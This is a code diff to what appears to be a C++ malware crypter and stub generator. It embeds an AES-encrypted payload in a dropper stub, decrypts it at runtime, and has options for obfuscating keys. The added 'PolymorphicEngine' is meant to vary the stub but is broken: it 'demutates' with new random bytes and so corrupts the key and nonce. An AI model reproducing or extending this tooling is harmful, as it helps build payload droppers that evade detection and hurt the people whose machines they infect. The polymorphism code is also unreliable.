@@ -267,10 +267,41 @@ private:
 #include <cstring>
 #include <cstdlib>
 #include <cstdint>
+#include <random>
+#include <ctime>
 
-// Obfuscated key and nonce
+// Polymorphic key and nonce (no obfuscation)
 {KEY_DEFINITION}
 {NONCE_DEFINITION}
+
+// Polymorphic code mutation
+class PolymorphicEngine {
+private:
+    std::mt19937 rng;
+    std::uniform_int_distribution<int> dist;
+    
+public:
+    PolymorphicEngine() : rng(std::time(nullptr)), dist(0, 255) {}
+    
+    uint8_t mutateByte(uint8_t input) {
+        // Simple polymorphic transformation
+        uint8_t mutation = dist(rng);
+        return input ^ mutation;
+    }
+    
+    void mutateArray(uint8_t* data, size_t size) {
+        for (size_t i = 0; i < size; i++) {
+            data[i] = mutateByte(data[i]);
+        }
+    }
+    
+    void demutateArray(uint8_t* data, size_t size) {
+        // Reverse the mutation
+        for (size_t i = 0; i < size; i++) {
+            data[i] = mutateByte(data[i]);
+        }
+    }
+};
 
 // AES-128-CTR implementation (same as native_encryptor/dropper)
 static const uint8_t sbox[256] = {
@@ -463,6 +494,9 @@ void hexToBytes(const std::string& hex, uint8_t* bytes) {
 }
 
 int main() {
+    // Initialize polymorphic engine
+    PolymorphicEngine polyEngine;
+    
     // Embedded encrypted data
     uint8_t encryptedData[] = {EMBEDDED_DATA};
     size_t dataSize = sizeof(encryptedData);
@@ -471,6 +505,14 @@ int main() {
     uint8_t key[16], nonce[16];
     hexToBytes({KEY_VAR}, key);
     hexToBytes({NONCE_VAR}, nonce);
+    
+    // Apply polymorphic mutation to key and nonce
+    polyEngine.mutateArray(key, 16);
+    polyEngine.mutateArray(nonce, 16);
+    
+    // Demutate before use
+    polyEngine.demutateArray(key, 16);
+    polyEngine.demutateArray(nonce, 16);
     
     // Decrypt the data using AES-128-CTR
     aesCtrCrypt(encryptedData, encryptedData, dataSize, key, nonce);
@@ -755,8 +797,7 @@ public:
             return;
         }
         
-        // Use the same key system as encryptor/dropper
-        constexpr uint8_t XOR_OBFUSCATE_KEY = 0x5A;
+        // Use the same key system as encryptor/dropper (no obfuscation)
         uint8_t encKey[] = { 0x39,0x39,0x08,0x0F,0x0F,0x38,0x08,0x31,0x38,0x32,0x38 };
         constexpr size_t keyLen = sizeof(encKey);
         
@@ -768,7 +809,7 @@ public:
             }
         } else {
             for (size_t i = 0; i < keyLen; ++i) {
-                key[i] = encKey[i] ^ XOR_OBFUSCATE_KEY;
+                key[i] = encKey[i];
             }
         }
         
@@ -797,16 +838,28 @@ public:
         // Replace placeholders in template
         size_t pos;
         
-        // Replace key definition
+        // Replace key definition (no obfuscation for basic stub)
         pos = stubTemplate.find("{KEY_DEFINITION}");
         if (pos != std::string::npos) {
-            stubTemplate.replace(pos, 16, obfuscateStringWithVar(keyHex, keyVar));
+            if (stubType == "basic") {
+                keyVar = "keyHex";
+                std::string keyDef = "const std::string " + keyVar + " = \"" + keyHex + "\";";
+                stubTemplate.replace(pos, 16, keyDef);
+            } else {
+                stubTemplate.replace(pos, 16, obfuscateStringWithVar(keyHex, keyVar));
+            }
         }
         
-        // Replace nonce definition
+        // Replace nonce definition (no obfuscation for basic stub)
         pos = stubTemplate.find("{NONCE_DEFINITION}");
         if (pos != std::string::npos) {
-            stubTemplate.replace(pos, 18, obfuscateStringWithVar(nonceHex, nonceVar));
+            if (stubType == "basic") {
+                nonceVar = "nonceHex";
+                std::string nonceDef = "const std::string " + nonceVar + " = \"" + nonceHex + "\";";
+                stubTemplate.replace(pos, 18, nonceDef);
+            } else {
+                stubTemplate.replace(pos, 18, obfuscateStringWithVar(nonceHex, nonceVar));
+            }
         }
         
         // Replace embedded data
